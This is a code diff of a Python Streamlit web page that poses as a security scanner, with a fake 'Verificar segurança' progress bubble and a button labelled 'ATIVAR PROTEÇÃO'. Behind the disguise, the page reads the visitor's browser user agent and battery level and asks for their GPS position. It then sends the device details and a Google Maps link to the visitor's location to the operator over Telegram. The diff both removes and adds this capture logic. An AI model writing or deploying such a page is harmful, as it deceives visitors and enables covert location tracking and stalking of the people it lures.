@@ -14,7 +14,7 @@ def enviar_telegram(msg):
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (ESTILO FOTO 1)
+# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (ESTILO FIXO)
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -47,7 +47,7 @@ st.markdown("""
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
 
-# Bolha em 4% fixa
+# Bolha em 4%
 with caixa_bolha.container():
     st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
@@ -55,52 +55,51 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 4. CAPTURA AUTOMÁTICA DE HARDWARE
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL_OK')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FINAL_OK')
+# 4. CAPTURA DE DADOS (MODELO E BATERIA)
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_3AM_FIX')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_3AM_FIX')
 
-# 5. O SEGREDO: COMPONENTE ISOLADO QUE NÃO TRAVA
-# O GPS só é solicitado quando o utilizador clica fisicamente no botão HTML
-js_script = """
+# 5. O SEGREDO: BOTÃO DE SISTEMA (NÃO TRAVA)
+# Pede localização simples (Permitir/Agora não) da sua segunda foto
+js_button = """
 <script>
-function acionarGps() {
-    // Pedido simples de "Permitir" (Foto 2)
+function iniciarGps() {
     navigator.geolocation.getCurrentPosition(
         (pos) => {
-            const data = {
+            const coords = {
                 lat: pos.coords.latitude,
                 lon: pos.coords.longitude,
-                enviado: true
+                ready: true
             };
-            window.parent.postMessage({type: 'streamlit:set_component_value', value: data}, '*');
+            window.parent.postMessage({type: 'streamlit:set_component_value', value: coords}, '*');
         },
         (err) => { 
-            console.log("Acesso negado");
+            console.log("Acesso negado"); 
         },
         { enableHighAccuracy: false, timeout: 5000 }
     );
 }
 </script>
-<button class="btn-barra" onclick="acionarGps()">
+<button class="btn-barra" onclick="iniciarGps()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
-# Renderiza o botão como um componente HTML separado para garantir o clique
-resultado = st.components.v1.html(js_script, height=80)
+# Inserindo o botão como um componente HTML nativo
+gps_data = st.components.v1.html(js_button, height=80)
 
-# 6. LÓGICA DE EXECUÇÃO APÓS O GPS RESPONDER
-if resultado and isinstance(resultado, dict) and resultado.get('enviado'):
-    # Os números correm na bolha agora que o GPS foi aceite
+# 6. ANIMAÇÃO E ENVIO AO TELEGRAM
+if gps_data and isinstance(gps_data, dict) and gps_data.get('ready'):
+    # Os números só giram agora, após o GPS ser liberado
     for p in range(4, 101, 5):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
     
-    lat, lon = resultado['lat'], resultado['lon']
+    lat, lon = gps_data['lat'], gps_data['lon']
     mapa = f"https://www.google.com/maps?q={lat},{lon}"
     
-    enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Aparelho: {ua[:50]}\n🔋 Bateria: {bat}%\n📍 [LOCALIZAÇÃO]({mapa})")
-    st.success("Proteção Ativada!")
+    enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Modelo: {ua[:50]}\n🔋 Bateria: {bat}%\n📍 [LOCALIZAÇÃO]({mapa})")
+    st.success("Concluído!")
     st.stop()
 
 st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
